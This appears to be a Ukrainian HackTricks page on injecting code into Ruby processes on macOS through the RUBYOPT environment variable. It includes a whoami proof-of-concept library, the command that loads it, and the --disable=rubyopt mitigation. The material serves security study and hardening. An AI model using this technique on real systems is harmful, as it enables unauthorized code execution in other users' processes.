# Ін’єкція в Ruby Applications у macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby аналізує підтримувані перемикачі командного рядка зі змінної середовища `RUBYOPT` перед запуском скрипту. Ruby відхиляє виконання коду через `-e` у `RUBYOPT`, але `-I` може додати каталог пошуку бібліотек, а `-r` може підключити бібліотеку. Таким чином, процес, який запускає Ruby з контрольованими зловмисником змінними середовища, можна змусити завантажити контрольований зловмисником Ruby-код.<sup>[[1]](#references)</sup>

Створіть `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Створіть безпечний Ruby-скрипт, наприклад `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Запустіть його з контрольованим значенням `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Щоб вимкнути цю поведінку, передайте `--disable=rubyopt` (або `--disable-rubyopt`) **перед** назвою скрипту:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Параметр, записаний після `hello.rb`, передається скрипту в `ARGV`; це не вимикає попередню обробку Ruby змінної `RUBYOPT`.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Документація Ruby - параметри командного рядка Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
